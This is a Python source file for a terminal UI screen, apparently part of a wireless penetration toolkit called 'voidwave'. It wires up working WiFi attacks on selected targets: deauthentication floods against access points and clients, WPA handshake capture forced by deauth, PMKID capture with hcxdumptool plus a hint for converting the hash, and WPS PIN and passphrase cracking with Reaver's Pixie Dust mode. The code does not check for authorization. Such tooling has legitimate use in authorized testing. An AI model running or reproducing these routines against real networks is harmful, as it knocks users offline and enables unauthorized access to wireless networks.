"""Wireless attacks screen with network scanning and attack options."""
from __future__ import annotations

import asyncio
import re
from dataclasses import dataclass, field
from datetime import datetime
from typing import TYPE_CHECKING

from textual.app import ComposeResult
from textual.containers import Horizontal, ScrollableContainer, Vertical
from textual.screen import Screen
from textual.widgets import (
    Button,
    DataTable,
    Input,
    Label,
    ListItem,
    ListView,
    OptionList,
    Select,
    Static,
    Switch,
)
from textual.widgets.option_list import Option

from voidwave.core.logging import get_logger
from voidwave.orchestration.events import Events
from voidwave.tui.helpers.preflight_runner import PreflightRunner

if TYPE_CHECKING:
    from textual.widgets.data_table import RowKey

logger = get_logger(__name__)


@dataclass
class AccessPoint:
    """Represents a discovered access point."""

    bssid: str
    essid: str
    channel: int
    power: int
    encryption: str
    cipher: str = ""
    auth: str = ""
    clients: int = 0
    beacons: int = 0
    data_packets: int = 0
    last_seen: datetime = field(default_factory=datetime.now)
    wps: bool = False
    wps_locked: bool = False


@dataclass
class WirelessClient:
    """Represents a connected wireless client."""

    mac: str
    bssid: str
    power: int
    packets: int = 0
    probes: str = ""
    last_seen: datetime = field(default_factory=datetime.now)


class InterfaceSelector(Static):
    """Widget for selecting wireless interface."""

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self.interfaces: list[str] = []
        self.selected: str | None = None

    def compose(self) -> ComposeResult:
        yield Label("[bold]Wireless Interface[/]")
        yield Select(
            [],
            prompt="Select interface",
            id="interface-select",
        )
        with Horizontal():
            yield Button("Refresh", id="btn-refresh-iface")
            yield Button("Monitor Mode", id="btn-monitor-mode", variant="primary")

    async def refresh_interfaces(self) -> None:
        """Refresh available interfaces."""
        import subprocess

        try:
            # Get wireless interfaces using iw
            result = subprocess.run(
                ["iw", "dev"],
                capture_output=True,
                text=True,
                timeout=5,
            )

            interfaces = []
            for line in result.stdout.split("\n"):
                if "Interface" in line:
                    iface = line.split()[-1]
                    interfaces.append(iface)

            self.interfaces = interfaces

            # Update select widget
            select = self.query_one("#interface-select", Select)
            select.set_options([(iface, iface) for iface in interfaces])

            if interfaces and not self.selected:
                self.selected = interfaces[0]
                select.value = interfaces[0]

        except Exception as e:
            logger.warning(f"Failed to get interfaces: {e}")


class NetworkTable(Static):
    """Table showing discovered wireless networks."""

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self.networks: dict[str, AccessPoint] = {}

    def compose(self) -> ComposeResult:
        yield Label("[bold cyan]Discovered Networks[/]")
        yield DataTable(id="network-table")

    def on_mount(self) -> None:
        table = self.query_one("#network-table", DataTable)
        table.add_columns(
            "BSSID", "ESSID", "CH", "PWR", "ENC", "CIPHER", "WPS", "Clients", "Data"
        )
        table.cursor_type = "row"

    def add_network(self, ap: AccessPoint) -> None:
        """Add or update a network in the table."""
        self.networks[ap.bssid] = ap
        self._refresh_table()

    def _refresh_table(self) -> None:
        """Refresh the table with current networks."""
        table = self.query_one("#network-table", DataTable)
        table.clear()

        # Sort by power (strongest first)
        sorted_networks = sorted(
            self.networks.values(),
            key=lambda x: x.power,
            reverse=True,
        )

        for ap in sorted_networks:
            wps_status = "Yes" if ap.wps else "No"
            if ap.wps_locked:
                wps_status = "Locked"

            table.add_row(
                ap.bssid,
                ap.essid[:20] if ap.essid else "<Hidden>",
                str(ap.channel),
                str(ap.power),
                ap.encryption,
                ap.cipher,
                wps_status,
                str(ap.clients),
                str(ap.data_packets),
                key=ap.bssid,
            )

    def get_selected_network(self) -> AccessPoint | None:
        """Get the currently selected network."""
        table = self.query_one("#network-table", DataTable)
        if table.cursor_row is not None:
            row_key = table.get_row_at(table.cursor_row)
            if row_key:
                bssid = str(table.get_cell_at((table.cursor_row, 0)))
                return self.networks.get(bssid)
        return None


class ClientTable(Static):
    """Table showing connected wireless clients."""

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self.clients: dict[str, WirelessClient] = {}

    def compose(self) -> ComposeResult:
        yield Label("[bold yellow]Connected Clients[/]")
        yield DataTable(id="client-table")

    def on_mount(self) -> None:
        table = self.query_one("#client-table", DataTable)
        table.add_columns("MAC", "BSSID", "PWR", "Packets", "Probes")
        table.cursor_type = "row"

    def add_client(self, client: WirelessClient) -> None:
        """Add or update a client in the table."""
        self.clients[client.mac] = client
        self._refresh_table()

    def filter_by_bssid(self, bssid: str | None) -> None:
        """Filter clients by BSSID."""
        self._refresh_table(bssid_filter=bssid)

    def _refresh_table(self, bssid_filter: str | None = None) -> None:
        """Refresh the table with current clients."""
        table = self.query_one("#client-table", DataTable)
        table.clear()

        clients = self.clients.values()
        if bssid_filter:
            clients = [c for c in clients if c.bssid == bssid_filter]

        for client in sorted(clients, key=lambda x: x.power, reverse=True):
            table.add_row(
                client.mac,
                client.bssid,
                str(client.power),
                str(client.packets),
                client.probes[:30] if client.probes else "",
                key=client.mac,
            )


class WirelessScreen(Screen):
    """Wireless attacks and WiFi operations screen."""

    CSS = """
    WirelessScreen {
        layout: grid;
        grid-size: 3 3;
        grid-columns: 1fr 2fr 2fr;
        grid-rows: auto 1fr auto;
    }

    #menu-panel {
        row-span: 3;
        border: solid $primary;
        padding: 1;
    }

    #menu-panel Label {
        margin-bottom: 1;
    }

    InterfaceSelector {
        height: auto;
        margin-bottom: 1;
        padding: 1;
        border: solid $secondary;
    }

    NetworkTable {
        height: 100%;
        border: solid $secondary;
        padding: 1;
    }

    ClientTable {
        height: 100%;
        border: solid $accent;
        padding: 1;
    }

    #attack-panel {
        height: auto;
        border: solid $warning;
        padding: 1;
    }

    #output-panel {
        height: 10;
        border: solid $surface;
        padding: 1;
    }

    .action-button {
        width: 100%;
        margin: 0 0 1 0;
    }

    #scan-controls {
        height: auto;
        padding: 1;
    }
    """

    BINDINGS = [
        ("escape", "app.pop_screen", "Back"),
        ("s", "start_scan", "Start Scan"),
        ("x", "stop_scan", "Stop Scan"),
        ("d", "deauth_attack", "Deauth"),
        ("h", "capture_handshake", "Capture"),
        ("r", "refresh_interfaces", "Refresh"),
    ]

    def __init__(self) -> None:
        super().__init__()
        self._scanning = False
        self._scan_task: asyncio.Task | None = None
        self._selected_network: AccessPoint | None = None
        self._preflight: PreflightRunner | None = None
        self._monitor_interface: str | None = None

    def compose(self) -> ComposeResult:
        # Left: Menu panel
        with Vertical(id="menu-panel"):
            yield Label("[bold magenta]Wireless Module[/]")
            yield InterfaceSelector(id="interface-selector")

            yield Label("[bold]Scan Controls[/]")
            yield Button("Start Scan", id="btn-start-scan", variant="success", classes="action-button")
            yield Button("Stop Scan", id="btn-stop-scan", variant="error", classes="action-button")

            yield Static("")
            yield Label("[bold]Attacks[/]")
            yield Button("Deauth Attack", id="btn-deauth", classes="action-button")
            yield Button("Capture Handshake", id="btn-handshake", classes="action-button")
            yield Button("PMKID Attack", id="btn-pmkid", classes="action-button")
            yield Button("WPS Attack", id="btn-wps", classes="action-button")

            yield Static("")
            yield Label("[bold]Options[/]")
            with Horizontal():
                yield Switch(value=True, id="switch-hop")
                yield Label(" Channel Hopping")
            yield Label("Target Channel:")
            yield Input(placeholder="All", id="input-channel")

        # Center: Network table
        yield NetworkTable(id="network-table-container")

        # Right: Client table
        yield ClientTable(id="client-table-container")

        # Bottom left: Attack panel
        with Vertical(id="attack-panel"):
            yield Label("[bold red]Attack Configuration[/]")
            yield Label("Target BSSID:")
            yield Input(placeholder="Auto from selection", id="input-bssid", disabled=True)
            yield Label("Target Client (optional):")
            yield Input(placeholder="FF:FF:FF:FF:FF:FF (broadcast)", id="input-client")
            yield Label("Deauth Count:")
            yield Input(value="10", id="input-deauth-count")

        # Bottom center/right: Output
        with Vertical(id="output-panel"):
            yield Label("[bold]Output[/]")
            yield Static("Ready. Select an interface and start scanning.", id="wireless-output")

    async def on_mount(self) -> None:
        """Initialize screen."""
        # Initialize preflight runner
        self._preflight = PreflightRunner(self.app)

        # Refresh interfaces using automation handler
        selector = self.query_one("#interface-selector", InterfaceSelector)
        await selector.refresh_interfaces()

        # If no interfaces found, show helpful message
        if not selector.interfaces:
            self._write_output(
                "[yellow]No wireless interfaces found.[/]\n"
                "[dim]Connect a monitor-mode capable WiFi adapter.[/]"
            )

        # Subscribe to wireless events
        self._subscribe_events()

    def _subscribe_events(self) -> None:
        """Subscribe to wireless-related events."""
        from voidwave.orchestration.events import event_bus

        event_bus.on(Events.NETWORK_FOUND, self._on_network_found)
        event_bus.on(Events.HANDSHAKE_CAPTURED, self._on_handshake_captured)

    async def _on_network_found(self, data: dict) -> None:
        """Handle network found event."""
        try:
            ap = AccessPoint(
                bssid=data.get("bssid", ""),
                essid=data.get("essid", ""),
                channel=int(data.get("channel", 0)),
                power=int(data.get("power", -100)),
                encryption=data.get("encryption", ""),
                cipher=data.get("cipher", ""),
                wps=data.get("wps", False),
            )

            network_table = self.query_one("#network-table-container", NetworkTable)
            self.app.call_from_thread(network_table.add_network, ap)

        except Exception as e:
            logger.warning(f"Failed to process network: {e}")

    async def _on_handshake_captured(self, data: dict) -> None:
        """Handle handshake captured event."""
        bssid = data.get("bssid", "unknown")
        self._write_output(f"[green]Handshake captured for {bssid}![/]")
        self.app.notify(f"Handshake captured: {bssid}", severity="information")

    def _write_output(self, message: str) -> None:
        """Write message to output panel."""
        output = self.query_one("#wireless-output", Static)
        output.update(message)

    async def on_button_pressed(self, event: Button.Pressed) -> None:
        """Handle button presses."""
        button_id = event.button.id

        if button_id == "btn-refresh-iface":
            selector = self.query_one("#interface-selector", InterfaceSelector)
            await selector.refresh_interfaces()
            self._write_output("[cyan]Interfaces refreshed[/]")

        elif button_id == "btn-monitor-mode":
            await self._toggle_monitor_mode()

        elif button_id == "btn-start-scan":
            await self._start_scan()

        elif button_id == "btn-stop-scan":
            await self._stop_scan()

        elif button_id == "btn-deauth":
            await self._deauth_attack()

        elif button_id == "btn-handshake":
            await self._capture_handshake()

        elif button_id == "btn-pmkid":
            await self._pmkid_attack()

        elif button_id == "btn-wps":
            await self._wps_attack()

    async def on_data_table_row_selected(self, event: DataTable.RowSelected) -> None:
        """Handle network selection."""
        if event.data_table.id == "network-table":
            network_table = self.query_one("#network-table-container", NetworkTable)
            ap = network_table.get_selected_network()

            if ap:
                self._selected_network = ap
                # Update BSSID input
                bssid_input = self.query_one("#input-bssid", Input)
                bssid_input.value = ap.bssid

                # Filter clients
                client_table = self.query_one("#client-table-container", ClientTable)
                client_table.filter_by_bssid(ap.bssid)

                self._write_output(f"[cyan]Selected: {ap.essid or ap.bssid} (CH {ap.channel})[/]")

    async def _toggle_monitor_mode(self) -> None:
        """Toggle monitor mode on selected interface."""
        # Check root first
        if not await self._preflight.ensure_root():
            return

        # Check for airmon-ng
        if not await self._preflight.ensure_tool("airmon-ng"):
            return

        selector = self.query_one("#interface-selector", InterfaceSelector)
        select = selector.query_one("#interface-select", Select)

        # If no interface selected, use modal to pick one
        if not select.value:
            interface = await self._preflight.ensure_interface("wireless")
            if not interface:
                return
        else:
            interface = str(select.value)

        try:
            # Check if already in monitor mode
            if interface.endswith("mon") or "mon" in interface:
                # Disable monitor mode
                from voidwave.tui.modals.preflight_modal import ConfirmModal

                confirm = await self.app.push_screen_wait(
                    ConfirmModal(
                        "Disable Monitor Mode",
                        f"Disable monitor mode on {interface}?"
                    )
                )
                if not confirm:
                    return

                self._write_output(f"[yellow]Disabling monitor mode on {interface}...[/]")

                from voidwave.automation.handlers.monitor import AutoMonHandler
                handler = AutoMonHandler(interface)
                handler.monitor_interface = interface
                await handler.disable_monitor_mode()

                self._write_output(f"[green]Monitor mode disabled[/]")
                self._monitor_interface = None
            else:
                # Enable monitor mode using preflight helper
                mon_iface = await self._preflight.ensure_monitor_mode(interface)
                if mon_iface:
                    self._monitor_interface = mon_iface
                    self._write_output(f"[green]Monitor mode enabled: {mon_iface}[/]")

            # Refresh interfaces
            await selector.refresh_interfaces()

        except Exception as e:
            self._write_output(f"[red]Error: {e}[/]")

    async def _start_scan(self) -> None:
        """Start wireless scanning."""
        if self._scanning:
            self._write_output("[yellow]Scan already running[/]")
            return

        # Check root
        if not await self._preflight.ensure_root():
            return

        # Check for airodump-ng
        if not await self._preflight.ensure_tool("airodump-ng"):
            return

        # Ensure we have a monitor-mode interface
        if self._monitor_interface:
            interface = self._monitor_interface
        else:
            # Try to get or enable monitor mode
            interface = await self._preflight.ensure_monitor_mode()
            if not interface:
                return
            self._monitor_interface = interface

        self._scanning = True
        self._write_output(f"[green]Starting scan on {interface}...[/]")

        # Start airodump-ng
        self._scan_task = asyncio.create_task(self._run_airodump(interface))

    async def _run_airodump(self, interface: str) -> None:
        """Run airodump-ng for scanning."""
        try:
            from voidwave.tools.airodump import AirodumpTool

            tool = AirodumpTool()
            await tool.initialize()

            options = {}

            # Check channel hopping
            hop_switch = self.query_one("#switch-hop", Switch)
            if not hop_switch.value:
                channel_input = self.query_one("#input-channel", Input)
                if channel_input.value.isdigit():
                    options["channel"] = int(channel_input.value)

            # This will stream output via events
            await tool.execute(interface, options)

        except asyncio.CancelledError:
            self._write_output("[yellow]Scan cancelled[/]")
        except Exception as e:
            self._write_output(f"[red]Scan error: {e}[/]")
        finally:
            self._scanning = False

    async def _stop_scan(self) -> None:
        """Stop wireless scanning."""
        if not self._scanning:
            self._write_output("[yellow]No scan running[/]")
            return

        if self._scan_task:
            self._scan_task.cancel()
            self._scan_task = None

        self._scanning = False
        self._write_output("[green]Scan stopped[/]")

    async def _deauth_attack(self) -> None:
        """Perform deauthentication attack."""
        # Check root
        if not await self._preflight.ensure_root():
            return

        # Check for aireplay-ng
        if not await self._preflight.ensure_tool("aireplay-ng"):
            return

        # Ensure monitor mode interface
        if not self._monitor_interface:
            interface = await self._preflight.ensure_monitor_mode()
            if not interface:
                return
            self._monitor_interface = interface
        else:
            interface = self._monitor_interface

        bssid_input = self.query_one("#input-bssid", Input)
        client_input = self.query_one("#input-client", Input)
        count_input = self.query_one("#input-deauth-count", Input)

        # Ensure target is selected
        if not bssid_input.value:
            if self._selected_network:
                bssid_input.value = self._selected_network.bssid
            else:
                from voidwave.tui.modals.preflight_modal import InputModal
                bssid = await self.app.push_screen_wait(
                    InputModal("Enter Target BSSID", "AA:BB:CC:DD:EE:FF")
                )
                if not bssid:
                    return
                bssid_input.value = bssid

        try:
            from voidwave.tools.aireplay import AireplayTool

            tool = AireplayTool()
            await tool.initialize()

            options = {
                "attack": "deauth",
                "bssid": bssid_input.value,
                "count": int(count_input.value) if count_input.value.isdigit() else 10,
            }

            if client_input.value:
                options["client"] = client_input.value

            self._write_output(f"[yellow]Sending deauth to {bssid_input.value}...[/]")
            result = await tool.execute(interface, options)

            if result.success:
                self._write_output(f"[green]Deauth attack completed[/]")
            else:
                self._write_output(f"[red]Deauth failed: {result.errors}[/]")

        except Exception as e:
            self._write_output(f"[red]Deauth error: {e}[/]")

    async def _capture_handshake(self) -> None:
        """Capture WPA handshake."""
        # Check root
        if not await self._preflight.ensure_root():
            return

        # Check tools
        if not await self._preflight.ensure_tool("airodump-ng"):
            return
        if not await self._preflight.ensure_tool("aireplay-ng"):
            return

        # Ensure monitor mode interface
        if not self._monitor_interface:
            interface = await self._preflight.ensure_monitor_mode()
            if not interface:
                return
            self._monitor_interface = interface
        else:
            interface = self._monitor_interface

        # Ensure target is selected
        if not self._selected_network:
            self._write_output("[yellow]No network selected - select a target from the table[/]")
            return

        ap = self._selected_network

        self._write_output(
            f"[yellow]Capturing handshake for {ap.essid or ap.bssid}...\n"
            f"Waiting for client to reconnect (deauth will be sent)[/]"
        )

        try:
            from voidwave.tools.airodump import AirodumpTool
            from voidwave.tools.aireplay import AireplayTool
            import tempfile
            from pathlib import Path

            # Create output file
            output_dir = Path(tempfile.mkdtemp(prefix="voidwave_"))
            output_file = output_dir / "handshake"

            # Start airodump focused on target
            airodump = AirodumpTool()
            await airodump.initialize()

            # Start capture in background
            capture_task = asyncio.create_task(
                airodump.execute(interface, {
                    "bssid": ap.bssid,
                    "channel": ap.channel,
                    "output": str(output_file),
                })
            )

            # Wait a moment for capture to start
            await asyncio.sleep(3)

            # Send deauth
            aireplay = AireplayTool()
            await aireplay.initialize()

            await aireplay.execute(interface, {
                "attack": "deauth",
                "bssid": ap.bssid,
                "count": 5,
            })

            # Wait for handshake (timeout after 60s)
            await asyncio.wait_for(capture_task, timeout=60)

            self._write_output(f"[green]Capture complete. Check {output_file}[/]")

        except asyncio.TimeoutError:
            self._write_output("[yellow]Capture timeout - handshake may not have been captured[/]")
        except Exception as e:
            self._write_output(f"[red]Capture error: {e}[/]")

    async def _pmkid_attack(self) -> None:
        """Perform PMKID attack using hcxdumptool."""
        # Check root
        if not await self._preflight.ensure_root():
            return

        # Check for hcxdumptool
        if not await self._preflight.ensure_tool("hcxdumptool"):
            return

        # Ensure monitor mode interface
        if not self._monitor_interface:
            interface = await self._preflight.ensure_monitor_mode()
            if not interface:
                return
            self._monitor_interface = interface
        else:
            interface = self._monitor_interface

        # Ensure target is selected
        if not self._selected_network:
            self._write_output("[yellow]No network selected - select a target from the table[/]")
            return

        network = self._selected_network

        self._write_output(f"[cyan]Starting PMKID attack on {network.essid} ({network.bssid})...[/]")

        try:
            import tempfile
            from pathlib import Path

            # Create output file
            output_dir = Path(tempfile.gettempdir()) / "voidwave"
            output_dir.mkdir(exist_ok=True)
            output_file = output_dir / f"pmkid_{network.bssid.replace(':', '')}.pcapng"

            self._write_output(f"[dim]Capturing PMKID to {output_file}...[/]")

            # Run hcxdumptool for PMKID capture
            proc = await asyncio.create_subprocess_exec(
                "hcxdumptool",
                "-i", interface,
                "-o", str(output_file),
                "--filterlist_ap", network.bssid,
                "--filtermode", "2",
                "--enable_status", "1",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )

            # Run for 30 seconds or until PMKID captured
            try:
                async def read_output():
                    pmkid_found = False
                    while True:
                        line = await proc.stdout.readline()
                        if not line:
                            break
                        decoded = line.decode().strip()
                        if decoded:
                            self._write_output(f"[dim]{decoded}[/]")
                            if "PMKID" in decoded.upper():
                                self._write_output("[green]PMKID captured![/]")
                                pmkid_found = True
                    return pmkid_found

                captured = await asyncio.wait_for(read_output(), timeout=30)

                if captured:
                    self._write_output(f"[green]PMKID saved to {output_file}[/]")
                    self._write_output("[cyan]Convert with: hcxpcapngtool -o hash.22000 " + str(output_file) + "[/]")
                else:
                    self._write_output("[yellow]Capture timeout - PMKID may not have been captured[/]")
                    self._write_output(f"[dim]Check {output_file} anyway[/]")

            except asyncio.TimeoutError:
                self._write_output("[yellow]Capture timeout - checking for PMKID...[/]")
                self._write_output(f"[dim]Output saved to {output_file}[/]")
            finally:
                proc.terminate()
                try:
                    await asyncio.wait_for(proc.wait(), timeout=5)
                except asyncio.TimeoutError:
                    proc.kill()

        except Exception as e:
            self._write_output(f"[red]PMKID attack error: {e}[/]")

    async def _wps_attack(self) -> None:
        """Perform WPS attack using Reaver."""
        # Check root
        if not await self._preflight.ensure_root():
            return

        # Check for reaver
        if not await self._preflight.ensure_tool("reaver"):
            return

        # Ensure monitor mode interface
        if not self._monitor_interface:
            interface = await self._preflight.ensure_monitor_mode()
            if not interface:
                return
            self._monitor_interface = interface
        else:
            interface = self._monitor_interface

        # Ensure target is selected
        if not self._selected_network:
            self._write_output("[yellow]No network selected - select a target from the table[/]")
            return

        network = self._selected_network

        # Check WPS status
        if not network.wps:
            self._write_output("[yellow]WPS status unknown - attempting attack anyway[/]")

        if network.wps_locked:
            self._write_output("[red]Warning: WPS appears to be locked on this AP[/]")

        self._write_output(f"[cyan]Starting WPS attack on {network.essid} ({network.bssid})...[/]")
        self._write_output("[dim]Using Pixie Dust attack (fast) - falls back to brute force if needed[/]")

        try:
            from voidwave.tools.reaver import ReaverTool

            tool = ReaverTool()
            await tool.initialize()

            # First try Pixie Dust (fast attack)
            self._write_output("[yellow]Attempting Pixie Dust attack...[/]")

            result = await tool.wps_attack(
                bssid=network.bssid,
                interface=interface,
                channel=network.channel,
                pixiedust=True,
                essid=network.essid if network.essid else None,
            )

            if result.get("pin"):
                self._write_output(f"[green]WPS PIN found: {result['pin']}[/]")
                if result.get("psk"):
                    self._write_output(f"[green]WPA PSK: {result['psk']}[/]")
                self.app.notify(f"WPS cracked! PIN: {result['pin']}", severity="information")
            elif result.get("locked"):
                self._write_output("[red]AP has rate limiting enabled - attack blocked[/]")
            else:
                self._write_output("[yellow]Pixie Dust failed - AP may not be vulnerable[/]")
                if result.get("errors"):
                    for err in result["errors"][:3]:  # Show first 3 errors
                        self._write_output(f"[dim]{err}[/]")

        except Exception as e:
            self._write_output(f"[red]WPS attack error: {e}[/]")

    def action_start_scan(self) -> None:
        """Start scan action."""
        asyncio.create_task(self._start_scan())

    def action_stop_scan(self) -> None:
        """Stop scan action."""
        asyncio.create_task(self._stop_scan())

    def action_deauth_attack(self) -> None:
        """Deauth attack action."""
        asyncio.create_task(self._deauth_attack())

    def action_capture_handshake(self) -> None:
        """Capture handshake action."""
        asyncio.create_task(self._capture_handshake())

    def action_refresh_interfaces(self) -> None:
        """Refresh interfaces action."""
        selector = self.query_one("#interface-selector", InterfaceSelector)
        asyncio.create_task(selector.refresh_interfaces())
